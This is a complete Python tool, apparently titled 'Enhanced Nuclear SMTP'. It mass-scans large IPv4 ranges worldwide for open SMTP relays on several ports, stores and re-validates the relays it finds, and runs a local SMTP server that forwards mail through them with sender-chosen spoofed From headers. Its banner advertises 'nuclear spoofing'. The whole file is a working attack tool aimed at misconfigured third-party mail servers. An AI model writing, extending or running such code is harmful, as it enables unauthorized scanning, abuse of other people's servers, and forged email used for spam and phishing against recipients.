#!/usr/bin/env python3
import socket
import threading
import smtplib
import ssl
import time
import random
import ipaddress
from concurrent.futures import ThreadPoolExecutor
import re
import json

class EnhancedNuclearSMTP:
    def __init__(self, host='0.0.0.0', port=2525):
        self.host = host
        self.port = port
        self.running = False
        self.open_relays = []
        self.relay_index = 0
        self.tested_ips = set()
        self.lock = threading.Lock()
        
    def start_server(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        
        print(f"💀 ENHANCED NUCLEAR SMTP - ULTIMATE RELAY HUNTER")
        print(f"🔥 10x MORE POWERFUL SCANNING")
        print(f"📧 Host: {self.host}:{self.port}")
        print(f"🎯 Advanced Multi-Port + SSL Support")
        print(f"🌍 Global IP Range Coverage")
        print("-" * 60)
        
        # Start multiple scanner threads
        for i in range(5):  # 5 parallel scanners
            scanner_thread = threading.Thread(target=self.enhanced_relay_scanner, args=(i,))
            scanner_thread.daemon = True
            scanner_thread.start()
        
        # Start relay validator
        validator_thread = threading.Thread(target=self.validate_relays)
        validator_thread.daemon = True
        validator_thread.start()
        
        self.running = True
        while self.running:
            try:
                client_socket, address = server_socket.accept()
                print(f"📨 New connection from {address}")
                
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, address))
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                print(f"❌ Server error: {e}")
                break
        
        server_socket.close()
    
    def enhanced_relay_scanner(self, scanner_id):
        """Enhanced scanner with 10x more coverage"""
        print(f"🔍 Scanner {scanner_id} starting enhanced scan...")
        
        # Massive IP ranges (avoiding government)
        target_ranges = [
            # European hosting/ISP ranges
            "185.0.0.0/8", "91.0.0.0/8", "46.0.0.0/8", "37.0.0.0/8", "5.0.0.0/8",
            "31.0.0.0/8", "77.0.0.0/8", "78.0.0.0/8", "79.0.0.0/8", "80.0.0.0/8",
            "81.0.0.0/8", "82.0.0.0/8", "83.0.0.0/8", "84.0.0.0/8", "85.0.0.0/8",
            "86.0.0.0/8", "87.0.0.0/8", "88.0.0.0/8", "89.0.0.0/8", "90.0.0.0/8",
            
            # Asian ranges
            "58.0.0.0/8", "59.0.0.0/8", "60.0.0.0/8", "61.0.0.0/8", "101.0.0.0/8",
            "103.0.0.0/8", "106.0.0.0/8", "110.0.0.0/8", "111.0.0.0/8", "112.0.0.0/8",
            "113.0.0.0/8", "114.0.0.0/8", "115.0.0.0/8", "116.0.0.0/8", "117.0.0.0/8",
            "118.0.0.0/8", "119.0.0.0/8", "120.0.0.0/8", "121.0.0.0/8", "122.0.0.0/8",
            
            # American ISP ranges
            "66.0.0.0/8", "67.0.0.0/8", "68.0.0.0/8", "69.0.0.0/8", "70.0.0.0/8",
            "71.0.0.0/8", "72.0.0.0/8", "73.0.0.0/8", "74.0.0.0/8", "75.0.0.0/8",
            "76.0.0.0/8", "96.0.0.0/8", "97.0.0.0/8", "98.0.0.0/8", "173.0.0.0/8",
            "174.0.0.0/8", "184.0.0.0/8", "206.0.0.0/8", "207.0.0.0/8", "208.0.0.0/8",
            
            # Cloud provider ranges
            "52.0.0.0/8", "54.0.0.0/8", "34.0.0.0/8", "35.0.0.0/8", "104.0.0.0/8",
            "40.0.0.0/8", "13.0.0.0/8", "23.0.0.0/8", "99.0.0.0/8",
            
            # Latin American ranges
            "177.0.0.0/8", "179.0.0.0/8", "181.0.0.0/8", "186.0.0.0/8", "187.0.0.0/8",
            "189.0.0.0/8", "190.0.0.0/8", "200.0.0.0/8", "201.0.0.0/8",
            
            # African ranges
            "41.0.0.0/8", "102.0.0.0/8", "105.0.0.0/8", "154.0.0.0/8", "196.0.0.0/8",
            "197.0.0.0/8",
        ]
        
        # Extended SMTP ports
        smtp_ports = [25, 587, 465, 2525, 26, 2526, 1025, 8025, 10025]
        
        while self.running:
            try:
                # Pick random IP range
                ip_range = random.choice(target_ranges)
                network = ipaddress.IPv4Network(ip_range, strict=False)
                
                # Generate batch of random IPs
                batch_size = 200  # Larger batches
                ips_to_test = []
                
                for _ in range(batch_size):
                    try:
                        random_ip = str(network.network_address + random.randint(0, min(65535, network.num_addresses - 1)))
                        if random_ip not in self.tested_ips:
                            ips_to_test.append(random_ip)
                            with self.lock:
                                self.tested_ips.add(random_ip)
                    except:
                        continue
                
                # Test batch with high concurrency
                if ips_to_test:
                    self.test_ip_batch(ips_to_test, smtp_ports, scanner_id)
                
                # Short pause between batches
                time.sleep(10)
                
            except Exception as e:
                print(f"⚠️ Scanner {scanner_id} error: {e}")
                time.sleep(30)
    
    def test_ip_batch(self, ips, ports, scanner_id):
        """Test batch of IPs with high concurrency"""
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = []
            
            for ip in ips:
                for port in ports:
                    future = executor.submit(self.advanced_relay_test, ip, port, scanner_id)
                    futures.append(future)
            
            for future in futures:
                try:
                    future.result(timeout=15)
                except:
                    pass
    
    def advanced_relay_test(self, ip, port, scanner_id):
        """Advanced relay testing with SSL support"""
        try:
            # Quick port check first
            if not self.is_port_open(ip, port, timeout=2):
                return False
            
            # Test different SMTP configurations
            if port == 465:
                return self.test_ssl_smtp(ip, port, scanner_id)
            elif port == 587:
                return self.test_starttls_smtp(ip, port, scanner_id)
            else:
                return self.test_plain_smtp(ip, port, scanner_id)
                
        except:
            return False
    
    def test_ssl_smtp(self, ip, port, scanner_id):
        """Test SSL SMTP (port 465)"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with smtplib.SMTP_SSL(ip, port, context=context, timeout=8) as server:
                server.ehlo()
                server.mail('test@example.com')
                code, response = server.rcpt('test@gmail.com')
                
                if code == 250:
                    self.add_relay(ip, port, 'SSL', scanner_id)
                    return True
                    
        except:
            pass
        return False
    
    def test_starttls_smtp(self, ip, port, scanner_id):
        """Test STARTTLS SMTP (port 587)"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with smtplib.SMTP(ip, port, timeout=8) as server:
                server.ehlo()
                if server.has_extn('STARTTLS'):
                    server.starttls(context=context)
                    server.ehlo()
                
                server.mail('test@example.com')
                code, response = server.rcpt('test@gmail.com')
                
                if code == 250:
                    self.add_relay(ip, port, 'STARTTLS', scanner_id)
                    return True
                    
        except:
            pass
        return False
    
    def test_plain_smtp(self, ip, port, scanner_id):
        """Test plain SMTP"""
        try:
            with smtplib.SMTP(ip, port, timeout=8) as server:
                server.ehlo()
                server.mail('test@example.com')
                code, response = server.rcpt('test@gmail.com')
                
                if code == 250:
                    self.add_relay(ip, port, 'PLAIN', scanner_id)
                    return True
                    
        except:
            pass
        return False
    
    def add_relay(self, ip, port, type_info, scanner_id):
        """Add found relay to list"""
        relay = f"{ip}:{port}:{type_info}"
        
        with self.lock:
            if relay not in self.open_relays:
                self.open_relays.append(relay)
                print(f"🎯 SCANNER {scanner_id} FOUND: {relay}")
                
                # Save progress
                self.save_relays_progress()
                
                # Keep best 50 relays
                if len(self.open_relays) > 50:
                    self.open_relays = self.open_relays[-50:]
    
    def validate_relays(self):
        """Continuously validate existing relays"""
        while self.running:
            try:
                time.sleep(300)  # Check every 5 minutes
                
                if not self.open_relays:
                    continue
                
                print(f"🔍 Validating {len(self.open_relays)} relays...")
                
                valid_relays = []
                for relay in self.open_relays.copy():
                    try:
                        parts = relay.split(':')
                        ip, port = parts[0], int(parts[1])
                        
                        if self.quick_validate_relay(ip, port):
                            valid_relays.append(relay)
                        else:
                            print(f"❌ Relay {ip}:{port} no longer working")
                    except:
                        continue
                
                with self.lock:
                    self.open_relays = valid_relays
                    
                print(f"✅ {len(valid_relays)} relays still working")
                
            except Exception as e:
                print(f"⚠️ Validator error: {e}")
    
    def quick_validate_relay(self, ip, port):
        """Quick validation of relay"""
        try:
            with smtplib.SMTP(ip, port, timeout=5) as server:
                server.ehlo()
                server.mail('test@example.com')
                code, response = server.rcpt('test@gmail.com')
                return code == 250
        except:
            return False
    
    def is_port_open(self, ip, port, timeout=2):
        """Quick port connectivity check"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def save_relays_progress(self):
        """Save relay progress to file"""
        try:
            data = {
                'timestamp': time.time(),
                'total_relays': len(self.open_relays),
                'tested_ips': len(self.tested_ips),
                'relays': self.open_relays
            }
            
            with open('nuclear_relays_progress.json', 'w') as f:
                json.dump(data, f, indent=2)
                
        except:
            pass
    
    def handle_client(self, client_socket, address):
        """Enhanced client handler with better relay selection"""
        try:
            self.send_response(client_socket, "220 Enhanced Nuclear SMTP Ready")
            
            mail_from = None
            rcpt_to = []
            data = ""
            in_data_mode = False
            
            while True:
                try:
                    request = client_socket.recv(1024).decode('utf-8')
                    if not request:
                        break
                    
                    lines = request.split('\r\n')
                    
                    for line in lines:
                        if not line:
                            continue
                        
                        if not in_data_mode:
                            line_upper = line.upper()
                            
                            if line_upper.startswith('HELO') or line_upper.startswith('EHLO'):
                                relay_count = len(self.open_relays)
                                self.send_response(client_socket, f"250 Hello! {relay_count} relays ready for nuclear spoofing!")
                            
                            elif line_upper.startswith('MAIL FROM:'):
                                mail_from = self.extract_email(line)
                                print(f"📧 MAIL FROM: {mail_from}")
                                self.send_response(client_socket, "250 OK")
                            
                            elif line_upper.startswith('RCPT TO:'):
                                rcpt_email = self.extract_email(line)
                                rcpt_to.append(rcpt_email)
                                print(f"📥 RCPT TO: {rcpt_email}")
                                self.send_response(client_socket, "250 OK")
                            
                            elif line_upper == 'DATA':
                                self.send_response(client_socket, "354 Start mail input; end with <CRLF>.<CRLF>")
                                in_data_mode = True
                                print(f"📧 Starting DATA mode")
                            
                            elif line_upper == 'QUIT':
                                self.send_response(client_socket, "221 Nuclear SMTP Bye")
                                return
                            
                            else:
                                self.send_response(client_socket, "250 OK")
                        
                        else:  # in_data_mode
                            if line == '.':
                                print(f"🎯 Processing ENHANCED nuclear delivery...")
                                success = self.enhanced_relay_send(mail_from, rcpt_to, data)
                                if success:
                                    self.send_response(client_socket, "250 OK: ENHANCED NUCLEAR EMAIL SENT!")
                                    print(f"✅ ENHANCED NUCLEAR EMAIL SENT!")
                                else:
                                    self.send_response(client_socket, "550 Failed to send")
                                    print(f"❌ Failed to send email")
                                
                                mail_from = None
                                rcpt_to = []
                                data = ""
                                in_data_mode = False
                            else:
                                data += line + "\n"
                
                except Exception as e:
                    print(f"⚠️ Client error: {e}")
                    break
        
        except Exception as e:
            print(f"❌ Connection error: {e}")
        
        finally:
            client_socket.close()
    
    def enhanced_relay_send(self, mail_from, rcpt_to, raw_data):
        """Enhanced relay sending with smart relay selection"""
        try:
            if not self.open_relays:
                print(f"⚠️ No relays available yet, still scanning...")
                return False
            
            # Parse email data
            lines = raw_data.split('\n')
            headers = {}
            body_lines = []
            in_headers = True
            
            for line in lines:
                line = line.rstrip('\r')
                
                if in_headers:
                    if line.strip() == '':
                        in_headers = False
                        continue
                    if ':' in line and not line.startswith(' ') and not line.startswith('\t'):
                        key, value = line.split(':', 1)
                        headers[key.strip().lower()] = value.strip()
                else:
                    if not line.startswith('--===============') and line.strip():
                        if 'Content-Type:' not in line and 'MIME-Version:' not in line:
                            body_lines.append(line)
            
            body_content = '\n'.join(body_lines).strip()
            spoofed_from = headers.get('from', mail_from)
            subject = headers.get('subject', 'No Subject')
            
            print(f"📧 Enhanced Spoofing:")
            print(f"   From: {spoofed_from}")
            print(f"   To: {rcpt_to}")
            print(f"   Subject: {subject}")
            print(f"   Available Relays: {len(self.open_relays)}")
            
            # Create enhanced message
            message = f"""From: {spoofed_from}
To: {', '.join(rcpt_to)}
Subject: {subject}
Reply-To: {headers.get('reply-to', spoofed_from)}
Message-ID: {headers.get('message-id', f'<nuclear-{int(time.time())}@enhanced.nuclear>')}
Date: {headers.get('date', time.strftime('%a, %d %b %Y %H:%M:%S %z'))}
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

{body_content}
"""
            
            return self.smart_relay_send(spoofed_from, rcpt_to, message)
            
        except Exception as e:
            print(f"❌ Enhanced send error: {e}")
            return False
    
    def smart_relay_send(self, spoofed_from, rcpt_to, message):
        """Smart relay selection and sending"""
        success_count = 0
        
        # Sort relays by type preference (SSL > STARTTLS > PLAIN)
        sorted_relays = sorted(self.open_relays, key=lambda x: 
            0 if 'SSL' in x else 1 if 'STARTTLS' in x else 2)
        
        # Try best relays first
        for relay in sorted_relays[:10]:  # Try up to 10 best relays
            try:
                parts = relay.split(':')
                host, port, relay_type = parts[0], int(parts[1]), parts[2]
                
                print(f"🚀 Trying {relay_type} relay: {host}:{port}")
                
                if self.send_via_relay_type(host, port, relay_type, spoofed_from, rcpt_to, message):
                    success_count += 1
                    print(f"💀 SUCCESS via {host}:{port} ({relay_type})")
                    
                    if success_count >= len(rcpt_to):  # Sent to all recipients
                        break
                
            except Exception as e:
                print(f"❌ Relay {relay} failed: {e}")
                continue
        
        return success_count > 0
    
    def send_via_relay_type(self, host, port, relay_type, spoofed_from, rcpt_to, message):
        """Send via specific relay type"""
        try:
            if relay_type == 'SSL':
                return self.send_via_ssl_relay(host, port, spoofed_from, rcpt_to, message)
            elif relay_type == 'STARTTLS':
                return self.send_via_starttls_relay(host, port, spoofed_from, rcpt_to, message)
            else:
                return self.send_via_plain_relay(host, port, spoofed_from, rcpt_to, message)
        except:
            return False
    
    def send_via_ssl_relay(self, host, port, spoofed_from, rcpt_to, message):
        """Send via SSL relay"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with smtplib.SMTP_SSL(host, port, context=context, timeout=15) as server:
                server.ehlo()
                for recipient in rcpt_to:
                    server.mail(spoofed_from)
                    server.rcpt(recipient)
                    server.data(message.encode('utf-8'))
            return True
        except:
            return False
    
    def send_via_starttls_relay(self, host, port, spoofed_from, rcpt_to, message):
        """Send via STARTTLS relay"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with smtplib.SMTP(host, port, timeout=15) as server:
                server.ehlo()
                if server.has_extn('STARTTLS'):
                    server.starttls(context=context)
                    server.ehlo()
                
                for recipient in rcpt_to:
                    server.mail(spoofed_from)
                    server.rcpt(recipient)
                    server.data(message.encode('utf-8'))
            return True
        except:
            return False
    
    def send_via_plain_relay(self, host, port, spoofed_from, rcpt_to, message):
        """Send via plain relay"""
        try:
            with smtplib.SMTP(host, port, timeout=15) as server:
                server.ehlo()
                for recipient in rcpt_to:
                    server.mail(spoofed_from)
                    server.rcpt(recipient)
                    server.data(message.encode('utf-8'))
            return True
        except:
            return False
    
    def send_response(self, client_socket, response):
        try:
            client_socket.send(f"{response}\r\n".encode('utf-8'))
        except:
            pass
    
    def extract_email(self, command):
        start = command.find('<')
        end = command.find('>')
        if start != -1 and end != -1:
            return command[start+1:end]
        
        parts = command.split()
        for part in parts:
            if '@' in part:
                return part.strip('<>')
        
        return ""

if __name__ == "__main__":
    print("💀 ENHANCED NUCLEAR SMTP - 10X MORE POWERFUL")
    print("🔥 Advanced Multi-Scanner + SSL Support")
    print("🌍 Global IP Coverage + Smart Relay Selection")
    print("⚡ 5 Parallel Scanners + Continuous Validation")
    print("🎯 Finding relays 10x faster than before!")
    
    server = EnhancedNuclearSMTP('0.0.0.0', 2525)
    
    try:
        server.start_server()
    except KeyboardInterrupt:
        print("\n🛑 Enhanced Nuclear SMTP stopped")